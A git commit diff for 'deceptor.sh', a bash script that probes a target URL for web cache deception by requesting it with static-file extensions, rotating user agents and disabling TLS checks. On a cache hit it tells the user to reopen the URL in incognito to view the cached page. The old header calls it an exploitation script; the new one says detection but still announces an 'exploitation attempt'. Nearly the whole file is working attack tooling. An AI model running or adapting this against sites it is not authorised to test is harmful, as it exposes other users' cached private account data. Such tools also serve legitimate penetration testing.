78105567f3155642a668abd816a2534b2790e912
akr3ch <97300177+akr3ch@users.noreply.github.com>
2024-10-07 20:42:07 +0600

    Update deceptor.sh
    Version 1.1

--- deceptor.sh
+++ deceptor.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
-##### Web Cache Deception exploitation script ####
-## coder: akrech				##
-## github: https://github.com/akr3ch		##
-## website: akr3ch.xyz   			##
-## twitter: akr3ch				##
+#####  Web Cache Deception detection script   ####
+## coder: akrech				                            ##
+## github: https://github.com/akr3ch		          ##
+## website: akr3ch.online   			                 ##
+## twitter: akr3ch				                          ##   
 ##################################################
 
-### colors codes ###
+### Color codes ###
 bold='\e[1m'
 red='\e[31m'
 green='\e[32m'
@@ -15,52 +15,91 @@ yellow='\e[33m'
 blue='\e[34m'
 none='\e[0m'
 
-if [[ ${1} == '-h' || ${1} == '--help' ]];then
-	### print the help menu ###
-	echo -e "\n${bold}${blue}${0} --url ${yellow}https://test.example.com/myaccount${none}\n"
-	echo -e "${green}Usage of the script too easy.Enter an url where unauthenticated users don't have any access and the script automatically sends requests to that endpoint until it gets a valid hit from that endpoint. All you need is the knowladge about web cache deception. What is web cache deception?"
-	echo -e "${green}Web cache deception ${blue}(WCD) ${green}is an ${red}attack${none} ${green}where an ${red}attacker${none} ${green}tricks a caching proxy into erroneously storing private information transmitted over the Internet and subsequently gains unauthorized access to that cached data."
-	exit 0
-elif [[ ${1} == '-u' || ${1} == '--url' ]];then
-	### take url input after before running ###
-	url=${2}
-	if [[ -z $url ]];then
-        echo -e "${yellow}${bold}[${blue}-${yellow}] ${none}${red}Please enter an url." && exit 0
-        fi
-elif [[ -z ${1} ]];then
-	### take url input after running ###
-	echo -e "${green}${bold}[${red}+${green}] ${none}${blue}Enter url address ↔ (example: https://example.com/myaccount)"
-	read -p "»» " url
-	if [[ -z $url ]];then
-	echo -e "${yellow}${bold}[${blue}-${yellow}] ${none}${red}Please enter a valid url." && exit 0
-	fi
+### Default Variables ###
+LOG_FILE="wcd_log_$(date +%F_%T).log"
+USER_AGENTS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" "Mozilla/5.0 (Linux; Android 10)")
+DEFAULT_EXTENSIONS=(.js .css .pdf .jpg .png .svg .xml .gif)
+DEFAULT_DYNAMIC_PATH=$(openssl rand -hex 8)  # Generate a random 8-character hex string
+threads=5  # Default number of parallel threads
+
+### Help Menu ###
+if [[ ${1} == '-h' || ${1} == '--help' ]]; then
+    echo -e "\n${bold}${blue}Usage: ${0} --url ${yellow}https://example.com/myaccount${none}\n"
+    echo -e "${green}This script tests for potential Web Cache Deception (WCD) vulnerabilities."
+    echo -e "${green}You can provide a URL and the script will test various file extensions to identify potential cache exposure."
+    echo -e "\nOptions:"
+    echo -e "  -u, --url \t\t The target URL to test."
+    echo -e "  -e, --extensions \t Custom extensions to test (comma-separated)."
+    echo -e "  -p, --path \t\t Custom path to append to the URL (default is a random string)."
+    echo -e "  -t, --threads \t Number of parallel threads to use for testing (default: 5)."
+    echo -e "  -l, --log \t\t Log output to a specified file (default: ${LOG_FILE})."
+    exit 0
 fi
 
-### extentions name ###
-extentions=(.js .css .jsp .asp .aspx .txt .html .htm .php5 .php4 .php3 .php .phtml .pdf .jpg .png .jpeg .svg .xml .gif)
-
-### print possible exploitable url paths ###
-for i in ${extentions[@]};do
-	echo -e "${green}[`date '+%T'`] ${none}${blue}Navigate to ${yellow}${url}/CacheCheck1337${i}"
+### URL and Option Parsing ###
+while [[ "$1" != "" ]]; do
+    case $1 in
+        -u | --url )        shift
+                            url=$1
+                            ;;
+        -e | --extensions ) shift
+                            IFS=',' read -r -a custom_extensions <<< "$1"
+                            ;;
+        -p | --path )       shift
+                            dynamic_path=$1
+                            ;;
+        -t | --threads )    shift
+                            threads=$1
+                            ;;
+        -l | --log )        shift
+                            LOG_FILE=$1
+                            ;;
+        * )                 echo -e "${red}Invalid option: $1${none}" && exit 1
+    esac
+    shift
 done
 
+### Check URL input ###
+if [[ -z ${url} ]]; then
+    echo -e "${red}[Error] Please provide a valid URL using --url option.${none}" && exit 1
+fi
 
-### main function ###
-function main(){
-while true;do
-	for x in ${extentions[@]};do
-		status=`curl -k --write-out "%{http_code}" --silent --output /dev/null "${url}/CacheCheck1337${x}"`
-	if [[ $status == '200' ]];then
-		echo -ne "\r${yellow}[`date '+%T'`]${none}${red} Cache data detected! ↔ extention used [${x}] \n"
-		echo -e "${yellow}[`date '+%T'`]${none}${red} Open the url from private mode (Incognito window)"
-		echo -e "${yellow}[`date '+%T'`]${none}${green} ${url}/CacheCheck1337${x}"
-		false
-	else
-		echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting..."
-	fi
-	done
+### Set Extensions and Dynamic Path ###
+extensions=("${custom_extensions[@]:-${DEFAULT_EXTENSIONS[@]}}")
+dynamic_path=${dynamic_path:-$DEFAULT_DYNAMIC_PATH}  # Use provided path or default random path
+
+### Print tested paths and extensions ###
+echo -e "\n${blue}Testing the following URL paths for Web Cache Deception with dynamic path: ${dynamic_path}\n"
+for ext in "${extensions[@]}"; do
+    echo -e "${green}[${blue}*${green}] ${url}/${dynamic_path}${ext}"
 done
+echo -e "\n${yellow}Starting exploitation attempt with ${threads} parallel threads...\n"
+
+### Function to send requests ###
+function send_request() {
+    ext=$1
+    ua=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
+    status=$(curl -k -A "$ua" --max-time 5 --write-out "%{http_code}" --silent --output /dev/null "${url}/${dynamic_path}${ext}")
+    if [[ $status == "200" ]]; then
+        echo -e "\r${yellow}[`date '+%T'`]${none}${red} Cache data detected! Extension: [${ext}]" | tee -a "$LOG_FILE"
+        echo -e "${yellow}[`date '+%T'`]${none}${red} Open the URL in Incognito mode: ${url}/${dynamic_path}${ext}" | tee -a "$LOG_FILE"
+    else
+        echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting for a valid response with ${ext}..."
+    fi
 }
 
-### run the main function ###
+### Function to run tasks in parallel ###
+function run_parallel() {
+    sem -j "$threads" send_request "$1"
+}
+
+### Main function with logging and concurrency ###
+function main() {
+    for ext in "${extensions[@]}"; do
+        run_parallel "$ext"
+    done
+    wait
+}
+
+### Start Testing ###
 main
